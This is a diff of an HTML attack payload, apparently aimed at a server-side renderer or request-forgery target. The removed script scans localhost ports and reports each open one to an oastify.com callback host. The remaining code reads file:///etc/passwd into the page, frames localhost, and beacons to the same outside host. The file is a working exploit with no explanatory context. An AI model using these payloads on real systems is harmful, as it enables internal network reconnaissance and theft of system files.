@@ -1,24 +1,12 @@
 <html>
-  <script>
-    const checkPort = (port) => {
-    fetch(`http://localhost:${port}`, { mode: "no-cors" }).then(() => {
-        let img = document.createElement("img");
-        img.src = `https://g1iz6r6w9641fp91r1fryhkvkmqde32s.oastify.com/ping?port=${port}`;
-    });
-}
-
-for(let i=0; i<1000; i++) {
-    checkPort(i);
-}
-    
-</script>
+  
   <script>x=new XMLHttpRequest;
 x.onload=function(){
 document.write(this.responseText)
 };
 x.open("GET","file:///etc/passwd");
 x.send();
-</script>"
+</script>
   <p id='my'>aaaaa</p>
   <iframe src=http://localhost/ height=400px width=600px><iframe>
     <img src="https://g1iz6r6w9641fp91r1fryhkvkmqde32s.oastify.com/startingScan">
